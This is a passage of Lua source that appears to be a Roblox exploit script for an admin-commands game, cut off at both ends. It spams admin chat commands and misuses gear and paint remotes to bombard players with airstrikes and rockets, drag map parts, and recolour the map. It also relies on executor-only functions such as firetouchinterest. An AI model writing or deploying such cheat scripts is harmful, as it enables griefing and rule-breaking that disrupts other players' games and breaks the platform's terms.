        				RainbowValue = 0
    				end

				fwait()
				PCheck()

				if Loops.rainbowmap and t then
						paintmap(Color3.fromHSV(RainbowValue,1,1).R,Color3.fromHSV(RainbowValue,1,1).G,Color3.fromHSV(RainbowValue,1,1).B)
						paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            					["Part"] = game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate,
                           					["Color"] = Color3.fromHSV(RainbowValue,1,1)
                        			})
				end		
		until not Loops.rainbowmap
end

function rbase()

		local RainbowValue = 0
		Loops.rbase = true
    		repeat task.wait()
        			RainbowValue = RainbowValue + 1/50
    			        if RainbowValue >= 1 then
        				RainbowValue = 0
    				end

				fwait()
				PCheck()

				if Loops.rbase and t then
						paint:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart",{
                            					["Part"] = game:GetService("Workspace").Terrain["_Game"].Workspace.Baseplate,
                           					["Color"] = Color3.fromHSV(RainbowValue,1,1)
                        			})
				end		
		until not Loops.rbase
end

function rfog(deranged)

		local RainbowValue = 0
		Loops.rfog = true
    		repeat task.wait(0.05)
        			RainbowValue = RainbowValue + 1/250
    			        if RainbowValue >= 1 then
        				RainbowValue = 0
    				end

				if game.Lighting.FogEnd ~= deranged then
            					Chat("fogend "..tostring(deranged))
        			end

				if Loops.rfog then
					Chat("fogcolor "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).R*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).G*255)).." "..tostring(math.floor(Color3.fromHSV(RainbowValue,1,1).B*255)))
				end		
		until not Loops.rfog
end

function paintmap(R,G,B)
	        coroutine.wrap(function()
			pcall(function()
				colorAPI.colorHouse_2({
					wallsC = {R,G,B},
					baseC = {R,G,B},
					roofC = {R,G,B},
					WANDDC = {R,G,B},
					stairsC = {R,G,B},
					floorC = {R,G,B},
					rooftsC = {R,G,B},
					chiC = {R,G,B}
				})
			end)
		end)()

		spawn(function()
				colorAPI.colorBuildingBricks_2({
					DarkStoneGrey = {R,G,B},
					DeepBlue = {R,G,B},
					NY = {R,G,B},
					IW = {R,G,B},
					LimeGreen = {R,G,B},
					MSG = {R,G,B},
					RB = {R,G,B},
					TP = {R,G,B},
					RR = {R,G,B}
				})
		end)
		
		colorAPI.colorObbyBox_2(R,G,B)
		colorAPI.colorObbyBricks_2(R,G,B)
		colorAPI.colorAdminDivs_2(R,G,B)
	        colorAPI.colorRegen_2(R,G,B)
		colorAPI.colorPads_2(R,G,B)
end

function IceMap()
        Chat('gear me 2758794374')
        repeat task.wait() until game.Players.LocalPlayer.Backpack:FindFirstChild("2019BloxyAward")
        local Bloxy = game.Players.LocalPlayer.Backpack:FindFirstChild("2019BloxyAward")
        task.wait()
        Bloxy.Parent = game.Players.LocalPlayer.Character
        task.wait()
        Remind("This will get most of the parts but not all of them!")
        for i,v in pairs(game.Workspace:GetDescendants()) do
		task.wait(0)
        	if v:IsA("BasePart") then
           		 firetouchinterest(v,Bloxy.Handle,0)
           		 firetouchinterest(v,Bloxy.Handle,1)
       		end
    	end
end

function Surround(mode)
       local fullCircle = 2 * math.pi
       local radius = 10 
       local function getXAndZPositions(angle)
                local x = math.cos(angle) * radius
                local z = math.sin(angle) * radius
                return x, z
        end
        SuperCMD("gear me 88885539")
        for i,c in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
                if c.Name == "Tactical Airstrike" then
                        local angle = i * (fullCircle / 50)
                        local x, z = getXAndZPositions(angle)
                        c.Parent = game.Players.LocalPlayer.Character
                        c:WaitForChild("OnMouseClick"):FireServer((workspace[surrer].HumanoidRootPart.CFrame * CFrame.new(x, 0, z)).p)
                end
        end
        if mode == "sur" then
                task.wait(1)
        else 
                task.wait(10)
        end
        Chat("ungear me")
end

function JNUKE()
	    for i = 1, 5 do
            		Chat("gear me 169602103")
            end	     
            repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= 5
            local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
            for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
            end
	    task.wait(0.1)
            for i = 1, 1000 do
                game.Players.LocalPlayer.Character.RocketJumper.FireRocket:FireServer(Vector3.new(math.random(-200,200), math.random(-40,40), math.random(-200,200)),Vector3.new(math.random(-200,200), math.random(0,50), math.random(-200,200)))
            end
	    task.wait(10)
end

function RNuke(range)
             SuperCMD("gear me 88885539")
	     task.wait(0.1)
             local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
             for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
             end
	     task.wait(0.1)
             for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then
        			pcall(function()
            				v.OnMouseClick:FireServer(game.Players.LocalPlayer.Character.HumanoidRootPart.Position+Vector3.new(math.random(range*-1,range),0,math.random(range*-1,range)))
        			end)
   		 	end
	     end
end

function Clone(getnum)
	 Chat("ungear me");task.wait(0.5)
         local pos = game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame
         for i = 1, tonumber(getnum) do
                    Chat('gear me 72644644');task.wait(0.01)
         end
         local oldchild = #workspace:GetChildren()
         repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
         local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
         for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            v:Activate()
         end
         repeat task.wait() until (#workspace:GetChildren() - oldchild) >= tonumber(getnum) 
         Chat("ungear me")
         game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = pos
end

function Table(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 110789105");task.wait(0.01)
        end
  --      local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Potion(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 27858062");task.wait(0.01)
        end
      --  local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function MineTrip(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 11999247");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Cannon(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 42201538");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Zombie(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 26421972");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Alpaca(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 292969139");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Piano(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 113299590");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Bassdrop(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 152233094");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Coolstory(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 119101643");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

function Banana(getnum)
	Chat("ungear me");task.wait(0.5)
        for i = 1, tonumber(getnum) do
                Chat("gear me 29100449");task.wait(0.01)
        end
     --   local oldchild = #workspace:GetChildren()
        repeat task.wait() until #game.Players.LocalPlayer.Backpack:GetChildren() >= tonumber(getnum) 
        local Backpack = game.Players.LocalPlayer:FindFirstChildOfClass("Backpack")
        for _, v in ipairs(Backpack:GetChildren()) do
                            v.Parent = game.Players.LocalPlayer.Character
                            task.wait(0.01)
                            v:Activate()
        end
end

--// ATTACHING STUFF \\ --
local Player = game.Players.LocalPlayer
local PlayerService = game:GetService("Players")

-- // attach v2 - credit to cmd y \\ --
function moveobject(part, o)
                if movestatus == false then
                        movestatus = true
                        if o == 1 then
                                if allclear() == true then
                                        removelimbs()
                                        task.wait()
                                        workspace.Gravity = 0
                                        Chat("size me .5")
                                        workspace.FallenPartsDestroyHeight = 0/0
                                        Chat("gear me 108158379")
                                        repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
                                        Player.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("IvoryPeriastron"))
                                        local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
                                        local randcoord = CFrame.new(math.random(-30593, -23388), math.random(-30593, -10455), math.random(-30593, -10455))
                                        Player.Character.HumanoidRootPart.CFrame = randcoord
                                        PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                                        if Player.Character.Torso:FindFirstChild("Weld") then
                                                Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                                        end
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        attach(part)
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        movestatus = false
                                else
                                                Chat("respawn me")
                                                ColFix()
                                                GravFix()
                                                Remind("Something went wrong removing the parts.")
                                end
                        elseif o == 2 then
                                local movcord = false
                                if allclear() == true then
                                        removelimbs()
                                        task.wait()
                                        Chat("size me .5")
                                        workspace.Gravity = 0
                                        workspace.FallenPartsDestroyHeight = 0/0
                                        Chat("gear me 108158379")
                                        repeat fwait() until Player.Backpack:FindFirstChild("IvoryPeriastron")
                                        Player.Character.Humanoid:EquipTool(Player.Backpack:FindFirstChild("IvoryPeriastron"))
                                        local ivory = Player.Character:FindFirstChild("IvoryPeriastron")
                                        local newcoord = CFrame.new(ogcframes[part.Name][1],ogcframes[part.Name][2],ogcframes[part.Name][3],ogcframes[part.Name][4],ogcframes[part.Name][5],ogcframes[part.Name][6],ogcframes[part.Name][7],ogcframes[part.Name][8],ogcframes[part.Name][9],ogcframes[part.Name][10],ogcframes[part.Name][11],ogcframes[part.Name][12]) * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0)
                                        movcord = true
                                        task.spawn(function()
                                                while movcord do
                                                        fwait() 
                                                        Player.Character.HumanoidRootPart.CFrame = newcoord
                                                        if movcord == false then 
                                                                break 
                                                        end
                                                end
                                        end)
                                        repeat fwait() 
                                        until Player.Character.HumanoidRootPart.CFrame == newcoord
                                        movcord = false
                                        if Player.Character.Torso:FindFirstChild("Weld") then
                                                Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                                        end
                                        PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        attach(part)
                                        task.wait(.25)
                                        if not Player.Character:FindFirstChild("IvoryPeriastron") then
                                                ColFix()
                                                GravFix()
                                                Chat("respawn me")
                                                movestatus = false
                                                return
                                        end
                                        ivory:WaitForChild("Remote"):FireServer(Enum.KeyCode.E)
                                        task.wait(.25)
                                        movestatus = false
                                else
                                        movcord = false
                                        Chat("respawn me")
                                        ColFix()
                                        GravFix()
                                        Remind("Something went wrong removing the parts.")
                                end
                        end
                end
        end

-- // remove limbs \\ --
function removelimbs()
        for i,v in pairs(PlayerService.LocalPlayer.Character.Torso:GetChildren()) do
                if v.Name == "Left Shoulder" then
                                v:Destroy()
                end
                if v.Name == "Left Hip" then
                                v:Destroy()
                end
                if v.Name == "Right Hip" then
                                v:Destroy()
                end
        end
end

-- // attach to the part \\ --
function attach(part)
                if Player.Character.Torso:FindFirstChild("Weld") then
                        Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                end
                PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                local tasmove = true

                task.spawn(function()
                        if Player.Character.Torso:FindFirstChild("Weld") then
                                Player.Character.Torso:FindFirstChild("Weld"):Destroy()
                        end
                        while true do
                                fwait()
                                if allclear() == true then
                                        --print("debug msg 1")
                                        PlayerService.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0, 0, 0)
                                        Player.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0) 
                                elseif allclear() == false then
                                        Chat("respawn me")
                                        ColFix()
                                        GravFix()
                                        Remind("Something went wrong moving the parts. Fixing game and respawning..")
                                        tasmove = false
                                end
                                if tasmove == false then 
                                        break 
                                end
                        end
                end)

                task.spawn(function() 
                        while tasmove do 
                                fwait()
                                Chat("unpunish me")
                                if allclear() == false then 
                                        Chat("respawn me")
                                        ColFix()
                                        GravFix()
                                        Remind("Something went wrong moving the parts. Fixing game and respawning..")
                                        tasmove = false
                                end 
                                if tasmove == false then 
                                        break 
                                end
                        end
                end)

                repeat fwait() Player.Character.HumanoidRootPart.CFrame = part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0) 
                until Player.Character.HumanoidRootPart.CFrame == part.CFrame * CFrame.new(-1*(part.Size.X/2)-(Player.Character.HumanoidRootPart.Size.X/2),0,0)
                repeat 
                        fwait() 
                        if allclear() == false then
                                break
                        end
                until 
                Player.Character.Torso:FindFirstChild("Weld")
                tasmove = false
end


task.spawn(function()
        while true do
                task.wait()
                if allclear() == false and movestatus == true then
                        Chat("respawn me")
                        ColFix()
                        GravFix()
                        Remind("Moving the part has stopped due to no character or no admin, respawning and fixing game..")
                end
        end
end)

-- // check if ready \\ --
function allclear()
                if workspace:FindFirstChild(game.Players.LocalPlayer.Name) and hasperm == true and workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid") and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid").Health > 0 then
                        --print("TRUE")
                        return true
                elseif workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace.Terrain._Game.Admin.Pads:FindFirstChild(game.Players.LocalPlayer.Name.."'s admin") and workspace:FindFirstChild(game.Players.LocalPlayer.Name) and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid") and workspace:FindFirstChild(game.Players.LocalPlayer.Name):FindFirstChild("Humanoid").Health > 0 then
                        --print("TRUE")
                        return true
                else
                        --print("FALSE")
                        movestatus = false
                        return false
                end
end

-- // special wait \\ --
function fwait()
                game:GetService("RunService").Heartbeat:Wait()
end

-- // another special wait \\ --
function rwait()
        game:GetService("RunService").RenderStepped:Wait()
end

-- // Attaching v3 - credits to ii admin and pr admin \\ -- 
-- // Not a replacement to the cmd y, just used for certain things \\ --
local lp = game.Players.LocalPlayer

function moveObject(target,movepos)

    function equipivory()
            if lp.Backpack:FindFirstChild("IvoryPeriastron") then
                    lp.Backpack.IvoryPeriastron.Parent = lp.Character
            else
                        if not lp.Character:FindFirstChild("IvoryPeriastron") then
                    Chat("gear me 108158379")
                    repeat wait() until lp.Backpack:FindFirstChild("IvoryPeriastron")
                    lp.Backpack.IvoryPeriastron.Parent = lp.Character
                end
            end
    end

    equipivory()

    if lp.Character:FindFirstChild("IvoryPeriastron") then
                local cf = lp.Character.HumanoidRootPart
                local veloing = true
                local gopos = movepos

                spawn(function()
                        repeat rwait()
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = gopos
                                game.Players.LocalPlayer.Character.HumanoidRootPart.Velocity = Vector3.new(0,0,0)
                                game.Players.LocalPlayer.Character.HumanoidRootPart.RotVelocity = Vector3.new(0,0,0)
                        until not veloing
                end)

                wait(0.2)
                veloing = false
                lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
                cf.Anchored = false
                local moveinnit = true

                local partinstance = Instance.new("Part",cf.Parent)
                partinstance.Anchored = true
                partinstance.Size = Vector3.new(10,1,10)
                partinstance.CFrame = (target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)) * CFrame.new(0,-3.5,0)

                spawn(function()
                        while true do
                                fwait()
                                game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
                                target.RotVelocity = Vector3.new(0,0,0)
                                target.Velocity = Vector3.new(0,0,0)
                                cf.Velocity = Vector3.new(0,0,0)
                                cf.RotVelocity = Vector3.new(0,0,0)
                                    cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(lp.Character['Torso'].Size.X/2), 0, 0)
                                if not moveinnit then 
                                        break 
                                end
                        end
                end)

                spawn(function() 
                        while moveinnit do 
                                fwait() 
                                Chat('unpunish me') 
                        end 
                end)

                wait(0.3)
                moveinnit = false
                lp.Character.IvoryPeriastron.Remote:FireServer(Enum.KeyCode.E)
                wait(0.3)
                Chat("respawn me")

        end
end

-- attach v1 for fixing baseplate --
function movepart(target)
	repeat wait() until game.Players.LocalPlayer.Character and game.Players.LocalPlayer.Character:FindFirstChild("Humanoid")
	local cf = game.Players.LocalPlayer.Character.HumanoidRootPart
	local rmoving = true;mready = false

	task.spawn(function()
			while true do
				fwait()
				game.Players.LocalPlayer.Character['Humanoid']:ChangeState(11)
				cf.CFrame = target.CFrame * CFrame.new(-1*(target.Size.X/2)-(game.Players.LocalPlayer.Character['Torso'].Size.X/2), 0, 0)
				if not rmoving then 
					break 
				end
			end
	end)
		
	task.spawn(function() 
			while rmoving do 
				task.wait(.1) 
				Chat('unpunish me') 
			end 
	end)

	task.wait(0.25)
	rmoving = false;mready = true

end

-- // COLOR API \\ --
-- // the reason why there's dupes is because of rainbow map needing the RGB instead of colour name and the api not having a conversion \\ --

colorAPI = {}
 
colorAPI.color = function(Part, color)
	local thread = coroutine.create(function() -- x3.5 speed boost
		local Arguments =
        {
            ["Part"] = Part,
            ["Color"] = color
        }
        game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Arguments)
	end)
	coroutine.resume(thread)
end

 
colorAPI.color_2 = function(Part, R,G,B)
	local thread = coroutine.create(function() -- x3.5 speed boost
		local Arguments =
        {
            ["Part"] = Part,
            ["Color"] = Color3.new(R,G,B)
        }
        game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Arguments)
	end)
	coroutine.resume(thread)
end
 
colorAPI.transformToColor3 = function(col)
    local r = col.r
    local g = col.g
    local b = col.b
    return Color3.new(r,g,b);
end

colorAPI.transformToColor3_2 = function(BrickClr)
	if typeof(BrickClr) == "BrickColor" then
		return BrickClr.Color.R,BrickClr.Color.G,BrickClr.Color.B
	end
end

-- colorAPI.Color3 = function(brickColor)
--     return colorAPI.transformToColor3(BrickColor.new(brickColor))
-- end

colorAPI.colorRegen_2 = function(R,G,B)
		if workspace.Terrain._Game.Admin:FindFirstChild("Regen") then
			colorAPI.color_2(workspace.Terrain._Game.Admin.Regen,R,G,B)
		end    
end    


colorAPI.colorObbyBox = function(color) -- Default is "Teal"
	for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
		colorAPI.color(v, color) -- colorAPI.transformToColor3(BrickColor.new("Bright red"))
	end
end

colorAPI.colorObbyBox_2 = function(R,G,B)
	for i,v in pairs(workspace.Terrain._Game.Workspace["Obby Box"]:GetChildren()) do
		colorAPI.color_2(v,R,G,B)
	end
end

colorAPI.colorObbyBricks = function(color)-- Default is "Really red"
	  for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
		colorAPI.color(v, color)
	end
end

colorAPI.colorObbyBricks_2 = function(R,G,B)
	  for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
		colorAPI.color_2(v, R,G,B)
	end
end

colorAPI.colorAdminDivs = function(color)-- Default is "Dark stone grey"
	for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
		colorAPI.color(v, color)
	end
end

colorAPI.colorAdminDivs_2 = function(R,G,B)
	for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
		colorAPI.color_2(v, R,G,B)
	end
end
 
colorAPI.colorPads = function(color)-- Default is "Bright green"
	for i,v in pairs(game.Workspace.Terrain["_Game"].Admin["Pads"]:GetChildren()) do
		colorAPI.color(v.Head, color)
	end
end

colorAPI.colorPads_2 = function(R,G,B)
	for i,v in pairs(game.Workspace.Terrain["_Game"].Admin["Pads"]:GetChildren()) do
		colorAPI.color_2(v.Head, R,G,B)
	end
end

colorAPI.colorHouse = function(arg)
	  local wallsC = arg.wallsC
	  local baseC = arg.baseC
	  local roofC = arg.roofC
	  local WANDDC = arg.WANDDC
	  local stairsC = arg.stairsC
	  local floorC = arg.floorC
	  local rooftsC = arg.rooftsC
	  local chiC = arg.chiC
 
	  -------------------------------------------------------------------- House (really messy ik) --------------------------------------------------------------------
 
		for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
			coroutine.wrap(function()
					if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
						colorAPI.color(v, wallsC) -- Default is "Brick yellow"
					end -- House walls
 
					if v.Name == "SmoothBlockModel40" then
						colorAPI.color(v, baseC) -- Default is "Bright green"
					end -- House grass base
 
					if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or 